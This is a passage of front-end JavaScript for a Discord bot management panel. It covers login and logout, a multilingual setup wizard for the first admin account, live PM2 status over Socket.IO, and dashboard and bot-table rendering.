    setTimeout(bootApp, 2000);
  }
}

function showApp() {
  document.getElementById('boot-screen').style.display = 'none';
  document.getElementById('login-page').classList.remove('visible');
  document.getElementById('setup-page').classList.remove('visible');
  document.getElementById('app').style.display = 'flex';
  applyRoleVisibility();
}

function showLogin() {
  document.getElementById('boot-screen').style.display = 'none';
  document.getElementById('login-page').classList.add('visible');
  document.getElementById('setup-page').classList.remove('visible');
  document.getElementById('app').style.display = 'none';
  setTimeout(() => document.getElementById('login-user')?.focus(), 100);
}

function showSetup() {
  document.getElementById('boot-screen').style.display = 'none';
  document.getElementById('setup-page').classList.add('visible');
  document.getElementById('login-page').classList.remove('visible');
  document.getElementById('app').style.display = 'none';
  setupStep(1);
  applySetupChromeLanguage();
}

async function doLogin() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const username = document.getElementById('login-user')?.value?.trim();
  const password = document.getElementById('login-pass')?.value;
  const errEl    = document.getElementById('login-error');
  const btn      = document.getElementById('login-btn');

  errEl.style.display = 'none';
  if (!username || !password) { errEl.textContent = _t('loginButton.fillAll'); errEl.style.display = 'block'; return; }

  btn.disabled = true;
  btn.innerHTML = `<div class="spinner spinner-sm"></div> ${_t('loginButton.connecting')}`;

  try {
    const data = await NexusAPI.auth.login(username, password);
    NexusAuth.setToken(data.token);
    NexusAuth.setUser(data);
    App.currentPage = null;
    App.instanceName = data.instance_name || 'Nexus Bot Manager';
    if (data.language && window.NexusI18n) NexusI18n.setLang(data.language, { persist: true });
    applyUserProfile(data);
    updateInstanceName(App.instanceName);

    showApp();
    initSocket();
    navigate('dashboard');
    refreshVersionBadge(true);
  } catch (e) {
    errEl.textContent = e.message;
    errEl.style.display = 'block';
    btn.disabled = false;
    btn.innerHTML = `<i class="ti ti-login"></i> ${_t('loginButton.submit')}`;
  }
}

function requestLogout() {
  if (App.settingsDirty.size || App.botDirty.size) {
    const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
    showUnsavedChangesDialog(() => {
      App.settingsDirty.clear();
      App.settingsSnapshot = null;
      App.botDirty.clear();
      updateSettingsDirtyBadge();
      doLogout();
    }, { desc: _t('settingsPage.unsavedLogoutDesc') });
    return;
  }
  doLogout();
}

// Server-side logout: revokes the presented token so a stolen copy stops
// working immediately instead of staying valid for the full 24h window.
// The local token is cleared either way, so a failed call never leaves the
// operator stuck on a page they cannot leave.
async function doLogout() {
  try { await NexusAPI.auth.logout(); } catch (_) { /* offline / already expired */ }
  NexusAuth.removeToken();
  if (App.socket) { App.socket.disconnect(); App.socket = null; }
  App.currentPage = null;
  App.currentParams = {};
  App.settingsDirty.clear();
  App.botDirty.clear();
  document.getElementById('app').style.display = 'none';
  showLogin();
}

function updateInstanceName(name) {
  const el = document.getElementById('sb-instance-name');
  if (el) el.textContent = name;
  document.title = `${name} — Nexus Bot Manager`;
}

// -- Setup wizard ------------------------------------------
let _setupData = {};
let _setupAvatarDraft = null;
let _setupTermsVersion = '1.0';
let _setupCurrentStep = 1;
// The backend reports whether POST /auth/setup requires the one-time
// bootstrap token. An older backend omits the field, so default to hiding
// it — the wizard stays usable against both.
let _setupNeedsToken = false;

function setupStep(n) {
  _setupCurrentStep = n;

  // Update step indicators
  document.querySelectorAll('.setup-step').forEach((el, i) => {
    el.classList.remove('done', 'current');
    if (i + 1 < n) el.classList.add('done');
    else if (i + 1 === n) el.classList.add('current');
  });

  const body = document.getElementById('setup-body');
  const prevBtn = document.getElementById('setup-prev');
  const nextBtn = document.getElementById('setup-next');

  if (prevBtn) prevBtn.style.display = n > 1 ? 'block' : 'none';
  if (nextBtn) nextBtn.textContent = n < 5
    ? (window.NexusI18n ? NexusI18n.t('common.next') : 'Suivant')
    : (window.NexusI18n ? NexusI18n.t('common.finishSetup') : 'Terminer la configuration');

  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;

  const steps = {
    // Step 1 — Language (FIRST, per spec)
    1: `
      <div style="text-align:center;padding:8px 0 8px;">
        <div style="font-size:48px;margin-bottom:16px;"><i class="ti ti-world" style="color:var(--blue);"></i></div>
        <h2 style="font-size:18px;font-weight:700;color:var(--tx-1);margin-bottom:8px;">${t('setup.step1Title')}</h2>
        <p style="color:var(--tx-3);font-size:13px;line-height:1.6;margin-bottom:18px;">${t('setup.step1Hint')}</p>
        <div class="lang-picker" id="setup-lang-picker">
          ${window.NexusI18n.SUPPORTED.map(code => `
            <button type="button" class="lang-pick${NexusI18n.current()===code?' active':''}" data-lang="${code}">
              <span class="lang-code">${window.NexusI18n.supportedCodes[code]}</span>
              <span class="lang-name">${window.NexusI18n.supportedNames[code]}</span>
            </button>`).join('')}
        </div>
      </div>`,

    // Step 2 — Welcome (now step 2)
    2: `
      <div style="text-align:center;padding:8px 0 16px;">
        <div style="font-size:48px;margin-bottom:16px;"><i class="ti ti-rocket" style="color:var(--blue);"></i></div>
        <h2 style="font-size:18px;font-weight:700;color:var(--tx-1);margin-bottom:8px;">${t('setup.step2Title')}</h2>
        <p style="color:var(--tx-3);font-size:13px;line-height:1.6;">${t('setup.step2Desc')}</p>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:20px;text-align:left;">
          ${[
            ['ti-server-2', t('setup.feature1')],
            ['ti-code', t('setup.feature2')],
            ['ti-activity', t('setup.feature3')],
            ['ti-shield-lock', t('setup.feature4')],
            ['ti-archive', t('setup.feature5')],
            ['ti-template', t('setup.feature6')]
          ].map(([icon, f]) =>
            `<div style="display:flex;align-items:center;gap:8px;padding:8px;background:var(--bg-elevated);border-radius:var(--r);font-size:12px;color:var(--tx-2);"><i class="ti ${icon}" style="font-size:15px;color:var(--tx-3);flex:none;"></i><span>${f}</span></div>`
          ).join('')}
        </div>
      </div>`,

    // Step 3 — Instance name
    3: `
      <div class="form-group">
        <label class="form-label">${t('setup.step3Title')}
          <span class="form-label-hint">${t('settings.instanceHint')}</span>
        </label>
        <input class="form-control" id="setup-instance" maxlength="80" placeholder="${t('setup.step3Placeholder')}" value="${esc(_setupData.instance_name || '')}"/>
        <div class="form-hint"><i class="ti ti-info-circle"></i>${t('setup.step3Hint')}</div>
      </div>`,

    // Step 4 — Admin account
    4: `
      <div class="grid-2">
        <div class="form-group">
          <label class="form-label">${t('setup.adminUser')}</label>
          <input class="form-control" id="setup-user" maxlength="64" placeholder="${t('setup.adminUserPh')}" value="${esc(_setupData.username || '')}" autocomplete="username" oninput="_setupData.username=this.value"/>
        </div>
        <div class="form-group">
          <label class="form-label">${t('profile.displayName')}</label>
          <input class="form-control" id="setup-display-name" maxlength="80" placeholder="${t('profile.displayNamePh')}" value="${esc(_setupData.display_name || '')}" oninput="_setupData.display_name=this.value"/>
        </div>
      </div>
      <div class="profile-editor" style="margin-bottom:14px;">
        <div class="profile-avatar-lg" id="setup-avatar-preview">${_setupAvatarDraft ? avatarImageHtml(_setupAvatarDraft, '') : esc(botInitials(_setupData.display_name || _setupData.username || 'A'))}</div>
        <div class="profile-editor-actions">
          <input type="file" id="setup-avatar-input" accept="image/png,image/jpeg,image/webp,image/gif" style="display:none" onchange="setupAvatarPicked(this)"/>
          <button class="btn btn-ghost btn-sm" type="button" onclick="document.getElementById('setup-avatar-input').click()"><i class="ti ti-upload"></i>${t('profile.chooseAvatar')}</button>
          <button class="btn btn-ghost btn-sm" type="button" onclick="setupAvatarRemove()"><i class="ti ti-x"></i>${t('profile.removeAvatar')}</button>
          <div class="form-hint" style="margin-top:4px;">${t('profile.avatarHint')}</div>
        </div>
      </div>
      <div class="form-group">
        <label class="form-label">${t('setup.adminPwd')} <span class="form-label-hint">${t('setup.adminPwdHint')}</span></label>
        <input class="form-control" id="setup-pwd" type="password" maxlength="72" autocomplete="new-password"/>
      </div>
      <div class="form-group">
        <label class="form-label">${t('setup.adminPwd2')}</label>
        <input class="form-control" id="setup-pwd2" type="password" maxlength="72" autocomplete="new-password"/>
      </div>
      <div class="form-group"${_setupNeedsToken ? '' : ' style="display:none;"'}>
        <label class="form-label">${t('setup.tokenTitle') || 'Setup token'}</label>
        <input class="form-control" id="setup-token" placeholder="${t('setup.tokenPh') || 'Paste the token printed in the server console'}" value="${esc(_setupData.setup_token || '')}" autocomplete="off"/>
        <div class="form-hint"><i class="ti ti-info-circle"></i>${t('setup.tokenHint') || 'Printed at server startup and stored in backend/data/setup-token (mode 0600).'}</div>
      </div>
      <div id="setup-err" style="display:none;" class="form-error"></div>`,

    // Step 5 — Terms of use
    5: `
      <div class="form-group">
        <label class="form-label">${t('terms.title')} <span class="form-label-hint">v${esc(_setupTermsVersion || '1.0')}</span></label>
        <p class="form-hint" style="margin-bottom:10px;">${esc(t('terms.intro'))}</p>
        <div class="terms-box">${esc(t('terms.text'))}</div>
      </div>
      <label class="form-check terms-check">
        <input type="checkbox" id="setup-terms"/>
        <span>${t('terms.accept')}</span>
      </label>
      <div id="setup-err" style="display:none;" class="form-error"></div>`,
  };

  if (body) body.innerHTML = steps[n] || '';

  // Bind language picker on step 1
  if (n === 1) {
    body?.querySelectorAll('.lang-pick').forEach(btn => {
      btn.addEventListener('click', () => {
        const code = btn.dataset.lang;
        NexusI18n.setLang(code);
        body.querySelectorAll('.lang-pick').forEach(b => b.classList.toggle('active', b.dataset.lang === code));
        // Re-render this step so the text updates
        setupStep(_setupCurrentStep);
        // Re-render header (title + subtitle) AND footer (buttons) so
        // the whole wizard reflects the new language immediately,
        // not just the body text.
        applySetupChromeLanguage();
      });
    });
  }

  // Focus first input
  setTimeout(() => body?.querySelector('input, button.lang-pick')?.focus(), 100);
}

/**
 * Re-apply translations to the static parts of the setup wizard
 * (header title/subtitle, footer buttons). Called when the user picks
 * a new language on step 1 so the entire UI — not just the body —
 * switches immediately.
 */
function setupAvatarPicked(input) {
  readSquareImage(input, 256, dataUrl => {
    _setupAvatarDraft = dataUrl;
    const preview = document.getElementById('setup-avatar-preview');
    if (preview) preview.innerHTML = avatarImageHtml(dataUrl, '');
  });
}

function setupAvatarRemove() {
  _setupAvatarDraft = null;
  const preview = document.getElementById('setup-avatar-preview');
  if (preview) preview.textContent = botInitials(_setupData.display_name || _setupData.username || 'A');
}

function applySetupChromeLanguage() {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const titleEl    = document.querySelector('.setup-title');
  const subtitleEl = document.querySelector('.setup-subtitle');
  if (titleEl)    titleEl.textContent    = t('setup.headerTitle');
  if (subtitleEl) subtitleEl.textContent = t('setup.headerSubtitle');

  const nextBtn = document.getElementById('setup-next');
  const prevBtn = document.getElementById('setup-prev');
  if (nextBtn) nextBtn.textContent = _setupCurrentStep < 5 ? t('common.next') : t('common.finishSetup');
  if (prevBtn) prevBtn.textContent = t('common.back');
}

async function setupNext() {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (_setupCurrentStep === 1) {
    // Language picker — go straight to step 2
    setupStep(2);
  } else if (_setupCurrentStep === 2) {
    // Welcome screen — continue to instance name
    setupStep(3);
  } else if (_setupCurrentStep === 3) {
    _setupData.instance_name = document.getElementById('setup-instance')?.value?.trim() || 'Nexus Bot Manager';
    setupStep(4);
  } else if (_setupCurrentStep === 4) {
    const username = document.getElementById('setup-user')?.value?.trim();
    const displayName = document.getElementById('setup-display-name')?.value?.trim() || username;
    const password = document.getElementById('setup-pwd')?.value;
    const confirm2 = document.getElementById('setup-pwd2')?.value;
    const setupToken = document.getElementById('setup-token')?.value?.trim() || '';
    const errEl    = document.getElementById('setup-err');

    if (_setupNeedsToken && !setupToken) { errEl.textContent = t('setup.errTokenMissing') || 'Setup token is required'; errEl.style.display = 'block'; return; }
    if (!username || username.length < 3) { errEl.textContent = t('setup.errUserShort'); errEl.style.display = 'block'; return; }
    // Must match the backend's MIN_PASSWORD_LENGTH (auth.js).
    if (!password || password.length < 8) { errEl.textContent = t('setup.errPwdShort'); errEl.style.display = 'block'; return; }
    if (password !== confirm2)            { errEl.textContent = t('setup.errPwdMismatch'); errEl.style.display = 'block'; return; }

    _setupData.username = username;
    _setupData.display_name = displayName;
    _setupData.password = password;
    _setupData.setup_token = setupToken;
    setupStep(5);
  } else if (_setupCurrentStep === 5) {
    const errEl = document.getElementById('setup-err');
    const accepted = !!document.getElementById('setup-terms')?.checked;
    if (!accepted) {
      errEl.textContent = t('terms.errAccept');
      errEl.style.display = 'block';
      return;
    }

    errEl.style.display = 'none';
    const btn = document.getElementById('setup-next');
    btn.disabled = true;
    btn.textContent = t('setup.configuring');

    try {
      const data = await NexusAPI.auth.setup({
        instance_name: _setupData.instance_name,
        username: _setupData.username,
        password: _setupData.password,
        display_name: _setupData.display_name || _setupData.username,
        avatar: _setupAvatarDraft,
        accept_terms: true,
        terms_version: _setupTermsVersion,
        language: NexusI18n ? NexusI18n.current() : 'en'
      }, _setupData.setup_token ? { headers: { 'X-Setup-Token': _setupData.setup_token } } : {});
      NexusAuth.setToken(data.token);
      applyUserProfile(data);
      App.instanceName = data.instance_name;
      updateInstanceName(data.instance_name);
      _setupData = {};
      _setupAvatarDraft = null;
      showApp();
      initSocket();
      navigate('dashboard');
      refreshVersionBadge(true);
      toast('success', t('setup.setupOk'), t('setup.welcomeUser', { name: data.username }));
    } catch (e) {
      errEl.textContent = e.message;
      errEl.style.display = 'block';
      btn.disabled = false;
      btn.textContent = t('common.finishSetup');
    }
  }
}

function setupPrev() {
  if (_setupCurrentStep > 1) setupStep(_setupCurrentStep - 1);
}

// ------------------------------------------------------------
// SOCKET.IO — Real-time status
// ------------------------------------------------------------
function initSocket() {
  if (typeof io === 'undefined' || App.socket) return;
  try {
    App.socket = io({
      auth: { token: NexusAuth.getToken() },
      reconnectionAttempts: 5,
      reconnectionDelay: 2000,
      transports: ['websocket', 'polling']
    });

    App.socket.on('connect',       () => { console.log('[socket] Connected'); updateConnStatus(true); });
    App.socket.on('disconnect',    () => { updateConnStatus(false); });
    App.socket.on('connect_error', (e) => { console.warn('[socket] Error:', e.message); });

    // Live PM2 status — update in memory and patch UI rows
    App.socket.on('pm2:status', (list) => {
      if (!Array.isArray(list)) return;
      list.forEach(p => { App.pm2StatusMap[p.name] = p; });
      // Update live badge in bot tables without re-rendering
      list.forEach(p => patchBotStatusInUI(p));
    });

  } catch (e) {
    console.warn('[socket] Init failed:', e.message);
  }
}

function patchBotStatusInUI(pm2) {
  const els = document.querySelectorAll(`[data-bot-status="${pm2.name}"]`);
  els.forEach(el => {
    // Build a fake pm2 obj compatible with statusBadge
    el.innerHTML = statusBadge({ status: pm2.status });
  });
  // Also update cpu/memory cells
  document.querySelectorAll(`[data-bot-cpu="${pm2.name}"]`).forEach(el => {
    el.textContent = pm2.status === 'online' ? `${pm2.cpu}%` : '—';
  });
  document.querySelectorAll(`[data-bot-mem="${pm2.name}"]`).forEach(el => {
    el.textContent = pm2.status === 'online' ? fmtMem(pm2.memory) : '—';
  });
}

function updateConnStatus(connected) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const dot = document.getElementById('conn-dot');
  if (dot) {
    dot.style.background = connected ? 'var(--green)' : 'var(--red)';
    dot.title = connected ? _t('connectionDot.connected') : _t('connectionDot.disconnected');
  }
}

// ------------------------------------------------------------
// DASHBOARD
// ------------------------------------------------------------
async function loadDashboard() {
  if (!isAdmin()) return loadUserDashboard();
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-dashboard');
  page.innerHTML = `<div class="loader"><div class="spinner spinner-lg"></div></div>`;

  try {
    const [bots, sysInfo, activity] = await Promise.all([
      NexusAPI.bots.list(),
      NexusAPI.system.info(),
      NexusAPI.system.activity(10),
    ]);

    App.bots = bots;
    App.systemInfo = sysInfo;

    // Merge live PM2 status
    bots.forEach(b => { if (App.pm2StatusMap[b.name]) b.pm2 = App.pm2StatusMap[b.name]; });

    const online  = bots.filter(b => b.pm2?.status === 'online').length;
    const errored = bots.filter(b => b.pm2?.status === 'errored').length;
    const stopped = bots.length - online - errored;

    document.getElementById('bots-badge').textContent = bots.length;

    page.innerHTML = `
      <!-- Stats -->
      <div class="stats-row mb-16">
        ${statCard('blue',  'ti-robot',       bots.length, t('dashboard.statBots'), t('dashboardPage.botCount', { n: bots.length }))}
        ${statCard('green', 'ti-wifi',        online,      t('dashboard.statRunning'), t('dashboardPage.available', { pct: bots.length>0?Math.round(online/bots.length*100):0 }))}
        ${statCard('red',   'ti-alert-circle',errored,     t('dashboard.statError'), errored > 0 ? t('dashboard.statErrorSub1') : t('dashboardPage.noProblem'))}
        ${statCard('amber', 'ti-clock',       `${sysInfo.uptime.days}j`,  t('dashboard.statUptime'), `${sysInfo.uptime.hours}h ${sysInfo.uptime.minutes}m`)}
      </div>

      <!-- System metrics -->
      <div class="grid-3 mb-16">
        ${metricCard('ti-cpu',      '#58a6ff', t('dashboard.statCpu'), `${sysInfo.cpu.load}%`,
          sysInfo.cpu.load, 'blue', `${t('dashboardPage.os')}: ${sysInfo.os.distro}`, `${t('dashboardPage.hostname')}: ${sysInfo.os.hostname}`)}
        ${metricCard('ti-database', '#a78bfa', t('dashboard.statRam'), `${sysInfo.memory.used} / ${sysInfo.memory.total} Go`,
          sysInfo.memory.pct, 'green', `${sysInfo.memory.pct}% ${t('dashboard.statRamPct')}`, `${(sysInfo.memory.total-sysInfo.memory.used).toFixed(1)} Go ${t('dashboard.statRamFree')}`)}
        ${metricCard('ti-server',   '#d29922', t('dashboard.statDisk'), `${sysInfo.disk.used} / ${sysInfo.disk.total} Go`,
          sysInfo.disk.pct, 'amber', sysInfo.disk.mount, `${sysInfo.disk.pct}% ${t('dashboard.statRamPct')}`)}
      </div>

      <!-- Env versions -->
      <div class="grid-4 mb-16">
        ${envCard('#3fb950','ti-brand-nodejs', t('dashboardPage.nodejs'), sysInfo.versions.node)}
        ${envCard('#cb3837','ti-package',     t('dashboardPage.npmVer'), sysInfo.versions.npm)}
        ${envCard('#58a6ff','ti-refresh',     t('dashboardPage.pm2Ver'), sysInfo.versions.pm2)}
        ${envCard('#5865f2','ti-brand-discord', t('dashboardPage.discordJs'), 'v14')}
      </div>

      <!-- Bots + Activity side by side -->
      <div class="grid-2" style="grid-template-columns:2fr 1fr;">
        <div>
          <div class="section-header mb-8">
            <span class="section-title"><i class="ti ti-robot"></i> ${esc(t('nav.bots'))}</span>
            <div class="tabs">
              <button class="tab-btn active" onclick="filterDash('all',this)">${esc(t('dashboardPage.all'))} (${bots.length})</button>
              <button class="tab-btn" onclick="filterDash('online',this)">${esc(t('dashboardPage.online'))} (${online})</button>
              <button class="tab-btn" onclick="filterDash('offline',this)">${esc(t('dashboardPage.offline'))} (${stopped+errored})</button>
            </div>
          </div>
          <div class="table-wrap" id="dash-bots">${renderBotsTable(bots)}</div>
        </div>
        <div>
          <div class="section-header mb-8"><span class="section-title"><i class="ti ti-activity"></i> ${esc(t('dashboardPage.recentEvents'))}</span></div>
          <div class="card">${renderActivity(activity)}</div>
        </div>
      </div>`;

    // Auto-refresh stats every 15s (lightweight)
    App.refreshTimers.dashboard = setInterval(async () => {
      try {
        const info = await NexusAPI.system.info();
        App.systemInfo = info;
        // Patch only the metric values, not full re-render
        const cpuEl = document.querySelector('[data-metric="cpu"]');
        if (cpuEl) cpuEl.textContent = `${info.cpu.load}%`;
        const ramEl = document.querySelector('[data-metric="ram"]');
        if (ramEl) ramEl.textContent = `${info.memory.used} / ${info.memory.total} Go`;
      } catch (_) {}
    }, 15000);

  } catch (e) {
    page.innerHTML = `<div class="loader" style="color:var(--red);"><i class="ti ti-alert-circle" style="font-size:28px;"></i><span>${esc(e.message)}</span></div>`;
  }
}

/**
 * Reduced dashboard for regular accounts: only the bots they can manage,
 * no host metrics and no global activity feed.
 */
async function loadUserDashboard() {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-dashboard');
  page.innerHTML = `<div class="loader"><div class="spinner spinner-lg"></div></div>`;
  try {
    const bots = await NexusAPI.bots.list();
    App.bots = bots;
    bots.forEach(b => { if (App.pm2StatusMap[b.name]) b.pm2 = App.pm2StatusMap[b.name]; });
    const online  = bots.filter(b => b.pm2?.status === 'online').length;
    const errored = bots.filter(b => b.pm2?.status === 'errored').length;
    const stopped = bots.length - online - errored;
    document.getElementById('bots-badge').textContent = bots.length;

    page.innerHTML = `
      <div class="section-title mb-16"><i class="ti ti-layout-dashboard"></i>${esc(t('dashboardPage.userTitle'))}</div>
      <div class="stats-row mb-16">
        ${statCard('blue',  'ti-robot',        bots.length, t('dashboard.statBots'), t('dashboardPage.botCount', { n: bots.length }))}
        ${statCard('green', 'ti-wifi',         online,      t('dashboard.statRunning'), t('dashboardPage.available', { pct: bots.length > 0 ? Math.round(online / bots.length * 100) : 0 }))}
        ${statCard('red',   'ti-alert-circle', errored,     t('dashboard.statError'), errored > 0 ? t('dashboard.statErrorSub1') : t('dashboardPage.noProblem'))}
        ${statCard('amber', 'ti-clock',        stopped,     t('dashboardPage.offline'), '')}
      </div>
      <div class="section-header mb-8">
        <span class="section-title"><i class="ti ti-robot"></i> ${esc(t('nav.bots'))}</span>
      </div>
      <div class="table-wrap">${renderBotsTable(bots)}</div>`;
  } catch (e) {
    page.innerHTML = `<div class="loader" style="color:var(--red);"><i class="ti ti-alert-circle" style="font-size:28px;"></i><span>${esc(e.message)}</span></div>`;
  }
}

function statCard(color, icon, value, label, delta) {
  return `<div class="stat-card ${color}">
    <div class="stat-icon"><i class="ti ${icon}"></i></div>
    <div class="stat-value">${esc(String(value))}</div>
    <div class="stat-label">${esc(label)}</div>
    <div class="stat-delta" style="color:var(--tx-3)">${esc(delta)}</div>
  </div>`;
}

function metricCard(icon, color, title, value, pct, fillClass, row1, row2) {
  const safeVal = esc(String(value ?? ''));
  const safePct = Math.min(100, Math.max(0, Number(pct) || 0));
  return `<div class="card">
    <div class="card-header">
      <span class="card-title"><i class="ti ${icon}" style="color:${color}"></i>${esc(title)}</span>
      <span style="font-size:14px;font-weight:700;color:${color}" data-metric="${title.toLowerCase()}">${safeVal}</span>
    </div>
    <div class="card-body">
      <div class="progress mb-8"><div class="progress-fill ${fillClass}" style="width:${safePct}%"></div></div>
      <div class="metric-row"><span class="metric-key">${esc(row1?.split(':')[0] || '')}
        </span><span class="metric-val">${esc(row1?.split(':').slice(1).join(':').trim() || row1 || '')}</span></div>
      <div class="metric-row"><span class="metric-key">${esc(row2?.split(':')[0] || '')}
        </span><span class="metric-val">${esc(row2?.split(':').slice(1).join(':').trim() || row2 || '')}</span></div>
    </div>
  </div>`;
}

function envCard(color, icon, label, value) {
  return `<div class="card" style="padding:12px 14px;">
    <div style="display:flex;align-items:center;gap:10px;">
      <span style="font-size:20px;color:${color};"><i class="ti ${icon}"></i></span>
      <div>
        <div style="font-size:10px;color:var(--tx-3);text-transform:uppercase;letter-spacing:0.3px;">${esc(label)}</div>
        <div style="font-size:13px;font-weight:600;font-family:var(--font-mono);">${esc(value)}</div>
      </div>
    </div>
  </div>`;
}

function renderActivity(activity) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (!activity || activity.length === 0) {
    return `<div class="empty-state" style="padding:20px;"><i class="ti ti-history"></i><span style="color:var(--tx-3);font-size:12px;">${esc(t('empty.noEvents'))}</span></div>`;
  }
  const icons = {
    bot_started:'ti-player-play', bot_stopped:'ti-player-pause', bot_restarted:'ti-refresh',
    bot_created:'ti-plus', bot_deleted:'ti-trash', bot_exported:'ti-archive', bot_imported:'ti-upload',
    bot_snapshot_created:'ti-camera', bot_snapshot_restored:'ti-restore', bot_snapshot_deleted:'ti-trash',
    bot_errored:'ti-alert-triangle', bot_deps_reinstalled:'ti-package',
    user_created:'ti-user-plus', user_updated:'ti-user-edit', user_deleted:'ti-user-minus',
    user_password_reset:'ti-key', profile_updated:'ti-user-circle',
    webhook_created:'ti-webhook', webhook_updated:'ti-webhook', webhook_deleted:'ti-webhook',
    panel_exported:'ti-download', panel_exported_settings:'ti-file-code',
    login:'ti-login', setup_complete:'ti-check', password_changed:'ti-key'
  };
  return `<div style="padding:4px 0;">${activity.map(a => `
    <div style="display:flex;align-items:center;gap:10px;padding:8px 14px;border-bottom:1px solid var(--border);">
      <i class="ti ${icons[a.action]||'ti-activity'}" style="color:var(--tx-3);font-size:14px;flex-shrink:0;"></i>
      <div style="flex:1;min-width:0;">
        <div style="font-size:12px;color:var(--tx-2);font-weight:500;">${esc(a.bot_name || a.details || a.action)}</div>
        <div style="font-size:10px;color:var(--tx-3);">${fmtDate(a.created_at)}</div>
      </div>
    </div>`).join('')}</div>`;
}

function filterDash(filter, btn) {
  btn.closest('.tabs').querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const list = filter === 'online'  ? App.bots.filter(b => b.pm2?.status === 'online')
             : filter === 'offline' ? App.bots.filter(b => !b.pm2 || b.pm2.status !== 'online')
             : App.bots;
  const el = document.getElementById('dash-bots');
  if (el) el.innerHTML = renderBotsTable(list);
}

// ------------------------------------------------------------
// BOTS TABLE (reusable)
// ------------------------------------------------------------
function renderBotsTable(bots) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (!bots || bots.length === 0) {
    return `<div class="empty-state">
      <i class="ti ti-robot"></i>
      <div class="empty-state-title">${esc(t('dashboardPage.noBotTitle'))}</div>
      <div class="empty-state-desc">${esc(isAdmin() ? t('dashboardPage.noBotDesc') : t('dashboardPage.noBotAssigned'))}</div>
      ${isAdmin() ? `<button class="btn btn-primary btn-sm mt-8" onclick="navigate('new-bot')"><i class="ti ti-plus"></i>${esc(t('dashboardPage.newBot'))}</button>` : ''}
    </div>`;
  }

  const rows = bots.map(bot => {
    const [bg, color] = botColor(bot.name);
    const pm2 = App.pm2StatusMap[bot.name] || bot.pm2;
    const isOnline = pm2?.status === 'online';
    return `<tr data-bot-row="${esc(bot.name)}" onclick="navigate('bot',{botName:'${escJs(bot.name)}'})">
      <td style="width:32px;padding:10px 8px 10px 14px;">
        <div class="bot-av" style="background:${bg};color:${color};">${botAvatarInner(bot)}</div>
      </td>
      <td>
        <div style="font-weight:600;color:var(--tx-1);">${esc(botDisplayName(bot))}${mcpBadge(bot)}</div>
        <div style="font-size:10px;color:var(--tx-3);font-family:var(--font-mono);">${esc(bot.name)} · /opt/${esc(bot.name)}</div>
      </td>
      <td><div data-bot-status="${esc(bot.name)}">${statusBadge(pm2)}</div></td>
      <td class="td-mono" data-bot-cpu="${esc(bot.name)}">${isOnline ? (pm2.cpu + '%') : '—'}</td>
      <td class="td-mono" data-bot-mem="${esc(bot.name)}">${isOnline ? fmtMem(pm2.memory) : '—'}</td>
      <td class="td-mono">${fmtUptime(pm2?.uptime)}</td>
      <td onclick="event.stopPropagation()">
        <div class="act-group">
          ${isOnline
            ? `<button class="act-btn act-stop" title="${esc(t('actionTitle.stop'))}"     onclick="botAction('stop','${escJs(bot.name)}',this)"><i class="ti ti-player-pause"></i></button>
               <button class="act-btn"          title="${esc(t('actionTitle.restart'))}"  onclick="botAction('restart','${escJs(bot.name)}',this)"><i class="ti ti-refresh"></i></button>`
            : `<button class="act-btn act-start" title="${esc(t('actionTitle.start'))}"   onclick="botAction('start','${escJs(bot.name)}',this)"><i class="ti ti-player-play"></i></button>`
          }
          <button class="act-btn act-edit"   title="${esc(t('actionTitle.logs'))}"  onclick="navigate('logs',{botName:'${escJs(bot.name)}'})"><i class="ti ti-terminal"></i></button>
          <button class="act-btn act-edit"   title="${esc(t('actionTitle.open'))}"  onclick="navigate('editor',{botName:'${escJs(bot.name)}'})"><i class="ti ti-code"></i></button>
          <button class="act-btn act-edit"   title="${esc(t('filesPage.title'))}"   onclick="navigate('files',{botName:'${escJs(bot.name)}'})"><i class="ti ti-folder"></i></button>
          ${isAdmin() ? `<button class="act-btn act-danger" title="${esc(t('actionTitle.delete'))}" onclick="confirmDelete('${escJs(bot.name)}')"><i class="ti ti-trash"></i></button>` : ''}
        </div>
      </td>
    </tr>`;
  }).join('');

  return `<table class="data-tbl">
    <thead><tr><th></th><th>${esc(t('bots.colName'))}</th><th>${esc(t('bots.colStatus'))}</th><th>${esc(t('bots.colCpu'))}</th><th>${esc(t('bots.colRam'))}</th><th>${esc(t('bots.colUptime'))}</th><th>${esc(t('bots.colActions'))}</th></tr></thead>
    <tbody>${rows}</tbody>
  </table>`;
}

// ------------------------------------------------------------
// BOT ACTIONS — No page reload, patch UI only
// ------------------------------------------------------------
async function botAction(action, botName, btn) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (btn) { btn.disabled = true; btn.innerHTML = '<div class="spinner spinner-sm"></div>'; }

  const labels = { start: _t('toasts.startOk'), stop: _t('toasts.stopOk'), restart: _t('toasts.restartOk') };

  try {
    const fn = { start: () => NexusAPI.bots.start(botName), stop: () => NexusAPI.bots.stop(botName), restart: () => NexusAPI.bots.restart(botName) }[action];
    if (!fn) throw new Error(_t('errors.generic'));
    await fn();
    toast('success', labels[action], botName);

    // Update bot in memory after short delay (PM2 needs time to change status)
    setTimeout(async () => {
      try {
        const pm2 = await NexusAPI.bots.pm2Status(botName);
        if (pm2) {
          App.pm2StatusMap[botName] = pm2;
          patchBotStatusInUI(pm2);
          // IMMEDIATE button-row sync for ALL views (not just Bot Detail).
          // 1) Bot Detail page — replace the hero action group
          if (App.currentPage === 'bot' && App.currentParams?.botName === botName) {
            const detailCard = document.querySelector('#page-bot .card.mb-16');
            if (detailCard) {
              const isOnline = pm2.status === 'online';
              const groupHtml = `
                <div class="flex gap-6">
                  ${isOnline
